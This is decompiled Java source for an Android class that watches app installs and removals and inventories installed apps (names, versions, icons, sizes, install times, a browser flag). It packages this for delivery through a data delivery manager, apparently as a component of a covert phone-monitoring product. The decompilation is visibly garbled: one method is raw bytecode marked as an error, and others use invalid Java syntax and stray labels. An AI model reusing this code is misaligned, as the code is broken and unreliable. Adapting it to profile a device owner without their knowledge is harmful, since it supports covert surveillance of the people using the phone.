package com.vvt.application_profile_manager;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import com.vvt.ab.d;
import com.vvt.base.RunningMode;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.h;
import com.vvt.events.FxApplicationEvent;
import com.vvt.io.q;
import com.vvt.phoenix.prot.command.ac;
import com.vvt.phoenix.prot.command.data.InstalledApplication;
import com.vvt.phoenix.prot.command.data.InstalledApplication.ApplicationType;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class ApplicationProfileManagerImpl implements d {
    enum ApplicationProfileManagerImpl$AppState {
        UNKNOWN,
        INSTALLED,
        UNINSTALLED
    }

    private static final boolean a = com.vvt.ak.a.a;
    private static final boolean b = com.vvt.ak.a.e;
    private static final boolean c = com.vvt.ak.a.b;
    private String d;
    private com.vvt.ab.b e;
    private AppProfileSettings f;
    private com.vvt.base.a g;
    private com.vvt.datadeliverymanager.b h;
    private PackageManager i;
    private boolean j;
    private RunningMode k;
    private int l;

    public ApplicationProfileManagerImpl(String paramString, RunningMode paramRunningMode, Context paramContext, com.vvt.base.a parama, com.vvt.datadeliverymanager.b paramb) {
        Object localObject = null;
        this.i = null;
        boolean bool = a;
        if (bool) {}

        this.i = paramContext.getPackageManager();
        this.d = paramString;
        this.k = paramRunningMode;
        this.g = parama;
        this.h = paramb;
        this.e = new com.vvt.ab.b();
        this.e.a(this);
        bool = a;
        if (bool) {}
    }

    private h a(HashSet paramHashSet, com.vvt.datadeliverymanager.a.a parama) {
        boolean bool1 = a;
        if (bool1) {}

        SimpleDateFormat localSimpleDateFormat = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        HashMap localHashMap = a(paramHashSet);
        ApplicationList localApplicationList = b();
        Object localObject1 = localApplicationList.getList();
        if (localObject1 == null) {
            localObject1 = new java.util.HashMap();
        }

        for (Object localObject2 = localObject1;; localObject2 = localObject1) {
            ac localac = new com.vvt.phoenix.prot.command.ac();
            Iterator localIterator = paramHashSet.iterator();
            bool1 = localIterator.hasNext();
            com.vvt.b.a locala;
            Object localObject3;
            if (bool1) {
                localObject1 = (String)localIterator.next();
                locala = com.vvt.b.b.a(this.i, (String)localObject1);
                localObject3 = locala.a();
                if (localObject3 == null) {
                    break label534;
                }
                localObject3 = ((String)localObject3).trim();
            }
            label534:
            for (Object localObject4 = localObject3;; localObject4 = localObject3) {
                boolean bool3 = com.vvt.ag.b.a((String)localObject4);
                if (!bool3)
                {
                    localObject3 = locala.a();
                    ((HashMap)localObject2).put(localObject1, localObject3);
                    bool3 = a;
                    if (bool3) {}
                    InstalledApplication localInstalledApplication = new com.vvt.phoenix.prot.command.data.InstalledApplication();
                    localInstalledApplication.b(locala.b());
                    localInstalledApplication.a(locala.a());
                    if (locala.f() != null) {
                        localInstalledApplication.a(locala.f());
                        int n = 7;
                        localInstalledApplication.b(n);
                    }
                    long l1 = locala.d();
                    Date date = new java.util.Date(l1);
                    String dateStr = localSimpleDateFormat.format(date);
                    localInstalledApplication.d(dateStr);
                    long l2 = 0L;
                    boolean bool4 = localHashMap.containsKey(localObject1);
                    if (bool4) {
                        localObject1 = (Long)localHashMap.get(localObject1);
                        l2 = ((Long)localObject1).longValue();
                    }
                    bool1 = a;
                    if (bool1) {}
                    int m = (int)l2;
                    localInstalledApplication.a(m);
                    localObject1 = locala.c();
                    localInstalledApplication.c((String)localObject1);
                    bool2 = a((String)localObject4);
                    if (bool2) {
                        localObject1 = InstalledApplication.ApplicationType.BROWSER;
                        localInstalledApplication.a((InstalledApplication.ApplicationType)localObject1);
                    }

                    for (;;) {
                        localac.a(localInstalledApplication);
                        break;
                        localObject1 = InstalledApplication.ApplicationType.NON_BROWSER;
                        localInstalledApplication.a((InstalledApplication.ApplicationType)localObject1);
                    }
                }
                boolean bool2 = a;
                if (!bool2) {
                    break;
                }
                break;
                bool2 = a;
                if (bool2) {}
                a(localApplicationList);
                bool2 = c;
                if (bool2) {}
                localObject1 = new com.vvt.datadeliverymanager.h;
                ((h)localObject1).a(25);
                ((h)localObject1).a(localac);
                ((h)localObject1).a(parama);
                ((h)localObject1).a(DeliveryRequestType.REQUEST_TYPE_NEW);
                ((h)localObject1).a(PriorityRequest.PRIORITY_NORMAL);
                ((h)localObject1).a(DataProviderType.DATA_PROVIDER_TYPE_NONE);
                ((h)localObject1).c(15);
                long l3 = 120000L;
                ((h)localObject1).b(l3);
                ((h)localObject1).c(true);
                ((h)localObject1).b(true);
                boolean bool5 = a;
                if (bool5) {}
                return (h)localObject1;
            }
        }
    }

    /* Error */
    private HashMap a(HashSet paramHashSet) {
        // Byte code:
        //   0: getstatic 32	com/vvt/application_profile_manager/ApplicationProfileManagerImpl:a	Z
        //   3: istore_2
        //   4: iload_2
        //   5: ifeq +3 -> 8
        //   8: new 88	java/util/HashMap
        //   11: astore_3
        //   12: aload_3
        //   13: invokespecial 89	java/util/HashMap:<init>	()V
        //   16: aload_1
        //   17: invokevirtual 98	java/util/HashSet:iterator	()Ljava/util/Iterator;
        //   20: astore 4
        //   22: aload 4
        //   24: invokeinterface 104 1 0
        //   29: istore_2
        //   30: iload_2
        //   31: ifeq +208 -> 239
        //   34: aload 4
        //   36: invokeinterface 108 1 0
        //   41: checkcast 110	java/lang/String
        //   44: astore 5
        //   46: iconst_1
        //   47: istore 6
        //   49: aload_0
        //   50: iload 6
        //   52: invokespecial 257	com/vvt/application_profile_manager/ApplicationProfileManagerImpl:a	(I)V
        //   55: aload_0
        //   56: getfield 45	com/vvt/application_profile_manager/ApplicationProfileManagerImpl:i	Landroid/content/pm/PackageManager;
        //   59: astore 7
        //   61: aload 7
        //   63: invokevirtual 261	java/lang/Object:getClass	()Ljava/lang/Class;
        //   66: astore 7
        //   68: ldc_w 263
        //   71: astore 8
        //   73: iconst_2
        //   74: istore 9
        //   76: iload 9
        //   78: anewarray 266	java/lang/Class
        //   81: astore 10
        //   83: iconst_0
        //   84: istore 11
        //   86: aconst_null
        //   87: astore 12
        //   89: ldc 110
        //   91: astore 13
        //   93: aload 10
        //   95: iconst_0
        //   96: aload 13
        //   98: aastore
        //   99: iconst_1
        //   100: istore 11
        //   102: ldc_w 268
        //   105: astore 13
        //   107: aload 10
        //   109: iload 11
        //   111: aload 13
        //   113: aastore
        //   114: aload 7
        //   116: aload 8
        //   118: aload 10
        //   120: invokevirtual 272	java/lang/Class:getMethod	(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
        //   123: astore 7
        //   125: aload_0
        //   126: getfield 45	com/vvt/application_profile_manager/ApplicationProfileManagerImpl:i	Landroid/content/pm/PackageManager;
        //   129: astore 8
        //   131: iconst_2
        //   132: istore 9
        //   134: iload 9
        //   136: anewarray 4	java/lang/Object
        //   139: astore 10
        //   141: iconst_0
        //   142: istore 11
        //   144: aconst_null
        //   145: astore 12
        //   147: aload 10
        //   149: iconst_0
        //   150: aload 5
        //   152: aastore
        //   153: iconst_1
        //   154: istore_2
        //   155: new 274	com/vvt/application_profile_manager/a
        //   158: astore 12
        //   160: aload 12
        //   162: aload_0
        //   163: aload_3
        //   164: invokespecial 277	com/vvt/application_profile_manager/a:<init>	(Lcom/vvt/application_profile_manager/ApplicationProfileManagerImpl;Ljava/util/HashMap;)V
        //   167: aload 10
        //   169: iload_2
        //   170: aload 12
        //   172: aastore
        //   173: aload 7
        //   175: aload 8
        //   177: aload 10
        //   179: invokevirtual 283	java/lang/reflect/Method:invoke	(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
        //   182: pop
        //   183: aload_0
        //   184: monitorenter
        //   185: aload_0
        //   186: getfield 285	com/vvt/application_profile_manager/ApplicationProfileManagerImpl:l	I
        //   189: istore_2
        //   190: iload_2
        //   191: ifeq +43 -> 234
        //   194: aload_0
        //   195: invokevirtual 288	java/lang/Object:wait	()V
        //   198: aload_0
        //   199: monitorexit
        //   200: goto -17 -> 183
        //   203: astore 5
        //   205: aload_0
        //   206: monitorexit
        //   207: aload 5
        //   209: athrow
        //   210: astore 5
        //   212: getstatic 36	com/vvt/application_profile_manager/ApplicationProfileManagerImpl:removeFromPath	Z
        //   215: istore_2
        //   216: iload_2
        //   217: ifeq +3 -> 220
        //   220: iconst_m1
        //   221: istore_2
        //   222: aload_0
        //   223: iload_2
        //   224: invokespecial 257	com/vvt/application_profile_manager/ApplicationProfileManagerImpl:a	(I)V
        //   227: aload_0
        //   228: invokevirtual 291	java/lang/Object:notify	()V
        //   231: goto -48 -> 183
        //   234: aload_0
        //   235: monitorexit
        //   236: goto -214 -> 22
        //   239: getstatic 32	com/vvt/application_profile_manager/ApplicationProfileManagerImpl:a	Z
        //   242: istore_2
        //   243: iload_2
        //   244: ifeq +3 -> 247
        //   247: getstatic 32	com/vvt/application_profile_manager/ApplicationProfileManagerImpl:a	Z
        //   250: istore_2
        //   251: iload_2
        //   252: ifeq +3 -> 255
        //   255: aload_3
        //   256: areturn
        //   257: astore 5
        //   259: goto -61 -> 198
        // Local variable table:
        //   start	length	slot	name	signature
        //   0	262	0	this	ApplicationProfileManagerImpl
        //   0	262	1	paramHashSet	HashSet
        //   3	167	2	bool1	boolean
        //   189	2	2	m	int
        //   215	2	2	bool2	boolean
        //   221	3	2	n	int
        //   242	10	2	bool3	boolean
        //   11	245	3	localHashMap	HashMap
        //   20	15	4	localIterator	Iterator
        //   44	107	5	str	String
        //   203	5	5	localObject1	Object
        //   210	1	5	localException	Exception
        //   257	1	5	localInterruptedException	InterruptedException
        //   47	4	6	i1	int
        //   59	115	7	localObject2	Object
        //   71	105	8	localObject3	Object
        //   74	61	9	i2	int
        //   81	97	10	localObject4	Object
        //   84	59	11	i3	int
        //   87	84	12	locala	a
        //   91	21	13	localClass	Class
        // Exception table:
        //   from	to	target	type
        //   185	189	203	finally
        //   194	198	203	finally
        //   198	200	203	finally
        //   205	207	203	finally
        //   234	236	203	finally
        //   50	55	210	java/lang/Exception
        //   55	59	210	java/lang/Exception
        //   61	66	210	java/lang/Exception
        //   76	81	210	java/lang/Exception
        //   96	99	210	java/lang/Exception
        //   111	114	210	java/lang/Exception
        //   118	123	210	java/lang/Exception
        //   125	129	210	java/lang/Exception
        //   134	139	210	java/lang/Exception
        //   150	153	210	java/lang/Exception
        //   155	158	210	java/lang/Exception
        //   163	167	210	java/lang/Exception
        //   170	173	210	java/lang/Exception
        //   177	183	210	java/lang/Exception
        //   194	198	257	java/lang/InterruptedException
    }

    private void a(int paramInt)
    {
        try
        {
            int m = this.l + paramInt;
            this.l = m;
            return;
        }
        finally {}
    }

    private void a(Intent paramIntent, ApplicationProfileManagerImpl.AppState paramAppState, long paramLong)
    {
        int m = a;
        if (m != 0) {}
        m = a;
        if (m != 0) {}
        ApplicationList localApplicationList = b();
        Object localObject1 = localApplicationList.getList();
        if (localObject1 == null)
        {
            localObject1 = new java/util/HashMap;
            ((HashMap)localObject1).<init>();
        }
        for (Object localObject2 = localObject1;; localObject2 = localObject1)
        {
            m = a;
            if (m != 0) {}
            localObject1 = paramIntent.getDataString();
            Object localObject3;
            int i2;
            if (localObject1 != null)
            {
                localObject3 = ((String)localObject1).trim();
                i2 = ((String)localObject3).length();
                if (i2 != 0) {}
            }
            else
            {
                localObject1 = "";
                localObject3 = localObject1;
                FxApplicationEvent localFxApplicationEvent = new com/vvt/events/FxApplicationEvent;
                localFxApplicationEvent.<init>();
                localFxApplicationEvent.setEventId(paramLong);
                long l1 = System.currentTimeMillis();
                localFxApplicationEvent.setEventTime(l1);
                localFxApplicationEvent.setApplicationId((String)localObject3);
                localObject1 = ApplicationProfileManagerImpl.AppState.INSTALLED;
                if (paramAppState != localObject1) {
                    break label494;
                }
                m = 1;
                label150:
                localFxApplicationEvent.setState(m);
                localObject1 = ApplicationProfileManagerImpl.AppState.INSTALLED;
                if (paramAppState == localObject1)
                {
                    localObject1 = com.vvt.b.b.a(this.i, (String)localObject3);
                    if (localObject1 != null)
                    {
                        Object localObject4 = ((com.vvt.b.a)localObject1).a();
                        localFxApplicationEvent.setName((String)localObject4);
                        localObject4 = ((com.vvt.b.a)localObject1).c();
                        localFxApplicationEvent.setVersion((String)localObject4);
                        int i3 = ((com.vvt.b.a)localObject1).e();
                        localFxApplicationEvent.setSize(i3);
                        localObject4 = ((com.vvt.b.a)localObject1).f();
                        localFxApplicationEvent.setIcon((byte[])localObject4);
                        boolean bool4 = a;
                        if (bool4) {}
                        localObject4 = ((com.vvt.b.a)localObject1).b();
                        localObject1 = ((com.vvt.b.a)localObject1).a();
                        ((HashMap)localObject2).put(localObject4, localObject1);
                    }
                    a(localApplicationList);
                }
                localObject1 = ApplicationProfileManagerImpl.AppState.UNINSTALLED;
                if (paramAppState == localObject1)
                {
                    boolean bool1 = ((HashMap)localObject2).containsKey(localObject3);
                    if (bool1)
                    {
                        localObject1 = (String)((HashMap)localObject2).get(localObject3);
                        localFxApplicationEvent.setName((String)localObject1);
                        bool1 = a;
                        if (bool1) {}
                        ((HashMap)localObject2).remove(localObject3);
                        a(localApplicationList);
                    }
                }
                localObject1 = localFxApplicationEvent.getName();
                if (localObject1 != null)
                {
                    localObject1 = ((String)localObject1).trim();
                    int n = ((String)localObject1).length();
                    if (n > 0)
                    {
                        localObject1 = new java/util/ArrayList;
                        ((ArrayList)localObject1).<init>();
                        ((List)localObject1).add(localFxApplicationEvent);
                        localObject2 = this.g;
                        if (localObject2 == null) {
                            break label500;
                        }
                        localObject2 = this.g;
                        ((com.vvt.base.a)localObject2).a((List)localObject1);
                    }
                }
            }
            for (;;)
            {
                boolean bool2 = c;
                if (bool2) {}
                bool2 = a;
                if (bool2) {}
                bool2 = a;
                if (bool2) {}
                return;
                i2 = ((String)localObject1).indexOf("package:") + 8;
                int i4 = ((String)localObject1).length();
                localObject1 = ((String)localObject1).substring(i2, i4);
                localObject3 = localObject1;
                break;
                label494:
                int i1 = 4;
                break label150;
                label500:
                boolean bool3 = b;
                if (!bool3) {}
            }
        }
    }

    private void a(AppProfileSettings paramAppProfileSettings)
    {
        Object[] arrayOfObject = new Object[2];
        String str1 = this.d;
        arrayOfObject[0] = str1;
        arrayOfObject[1] = "app_profile_settings.dat";
        String str2 = String.format("%s/%s", arrayOfObject);
        q.a(paramAppProfileSettings, str2);
    }

    private void a(ApplicationList paramApplicationList)
    {
        Object[] arrayOfObject = new Object[2];
        String str1 = this.d;
        arrayOfObject[0] = str1;
        arrayOfObject[1] = "app_list.dat";
        String str2 = String.format("%s/%s", arrayOfObject);
        q.a(paramApplicationList, str2);
    }

    private boolean a(String paramString)
    {
        String str = "Chrome";
        boolean bool = paramString.equalsIgnoreCase(str);
        if (!bool)
        {
            str = "Dolphin";
            bool = paramString.equalsIgnoreCase(str);
            if (!bool)
            {
                str = "Opera";
                bool = paramString.equalsIgnoreCase(str);
                if (!bool)
                {
                    str = "Firefox";
                    bool = paramString.equalsIgnoreCase(str);
                    if (!bool)
                    {
                        str = "Internet";
                        bool = paramString.equalsIgnoreCase(str);
                        if (!bool) {
                            break label74;
                        }
                    }
                }
            }
        }
        bool = true;
        for (;;)
        {
            return bool;
            label74:
            bool = false;
            str = null;
        }
    }

    private ApplicationList b()
    {
        int m = 2;
        Object[] arrayOfObject = new Object[m];
        String str = this.d;
        arrayOfObject[0] = str;
        int n = 1;
        str = "app_list.dat";
        arrayOfObject[n] = str;
        Object localObject = q.a(String.format("%s/%s", arrayOfObject));
        if (localObject != null)
        {
            boolean bool = localObject instanceof ApplicationList;
            if (bool) {
                localObject = (ApplicationList)localObject;
            }
        }
        for (;;)
        {
            return (ApplicationList)localObject;
            localObject = new com/vvt/application_profile_manager/ApplicationList;
            ((ApplicationList)localObject).<init>();
        }
    }

    private AppProfileSettings c()
    {
        int m = 2;
        Object[] arrayOfObject = new Object[m];
        String str = this.d;
        arrayOfObject[0] = str;
        int n = 1;
        str = "app_profile_settings.dat";
        arrayOfObject[n] = str;
        Object localObject = q.a(String.format("%s/%s", arrayOfObject));
        if (localObject != null)
        {
            boolean bool = localObject instanceof AppProfileSettings;
            if (bool) {
                localObject = (AppProfileSettings)localObject;
            }
        }
        for (;;)
        {
            return (AppProfileSettings)localObject;
            localObject = new com/vvt/application_profile_manager/AppProfileSettings;
            ((AppProfileSettings)localObject).<init>();
        }
    }

    public void a()
    {
        boolean bool = a;
        if (bool) {}
        AppProfileSettings localAppProfileSettings = c();
        this.f = localAppProfileSettings;
        bool = a;
        if (bool) {}
    }

    public void a(Context paramContext)
    {
        boolean bool = a;
        if (bool) {}
        bool = a;
        if (bool) {}
        Object localObject = this.k;
        RunningMode localRunningMode = RunningMode.FULL;
        if (localObject != localRunningMode)
        {
            localObject = this.e;
            ((com.vvt.ab.b)localObject).a(paramContext);
            this.j = true;
            bool = a;
            if (!bool) {}
        }
        bool = a;
        if (bool) {}
    }

    public void a(Context paramContext, Intent paramIntent)
    {
        boolean bool1 = a;
        if (bool1) {}
        Object localObject = paramIntent.getAction();
        ApplicationProfileManagerImpl.AppState localAppState = ApplicationProfileManagerImpl.AppState.UNKNOWN;
        String str = "android.intent.action.PACKAGE_ADDED";
        boolean bool2 = ((String)localObject).equals(str);
        if (bool2) {
            localAppState = ApplicationProfileManagerImpl.AppState.INSTALLED;
        }
        for (;;)
        {
            localObject = this.f;
            long l1 = ((AppProfileSettings)localObject).refId;
            long l2 = 1L;
            l1 += l2;
            ((AppProfileSettings)localObject).refId = l1;
            localObject = this.f;
            a((AppProfileSettings)localObject);
            localObject = ApplicationProfileManagerImpl.AppState.UNKNOWN;
            if (localAppState != localObject)
            {
                localObject = this.f;
                long l3 = ((AppProfileSettings)localObject).refId;
                a(paramIntent, localAppState, l3);
            }
            bool1 = a;
            if (bool1) {}
            return;
            str = "android.intent.action.PACKAGE_REMOVED";
            boolean bool3 = ((String)localObject).equals(str);
            if (bool3) {
                localAppState = ApplicationProfileManagerImpl.AppState.UNINSTALLED;
            }
        }
    }

    public void a(com.vvt.datadeliverymanager.a.a parama)
    {
        boolean bool1 = a;
        if (bool1) {}
        Object localObject = com.vvt.b.b.a(this.i, true);
        boolean bool2 = c;
        if (bool2) {}
        localObject = a((HashSet)localObject, parama);
        com.vvt.datadeliverymanager.b localb = this.h;
        if (localb == null)
        {
            localObject = new java/lang/NullPointerException;
            ((NullPointerException)localObject).<init>("DataDeliveryManager is not set!!");
            throw ((Throwable)localObject);
        }
        bool2 = c;
        if (bool2) {}
        localb = this.h;
        localb.a((h)localObject);
        bool1 = a;
        if (bool1) {}
    }

    public void b(Context paramContext)
    {
        boolean bool = a;
        if (bool) {}
        com.vvt.ab.b localb = this.e;
        if (localb != null)
        {
            this.e.b(paramContext);
            bool = false;
            localb = null;
            this.j = false;
        }
        bool = a;
        if (bool) {}
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/application_profile_manager/ApplicationProfileManagerImpl.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */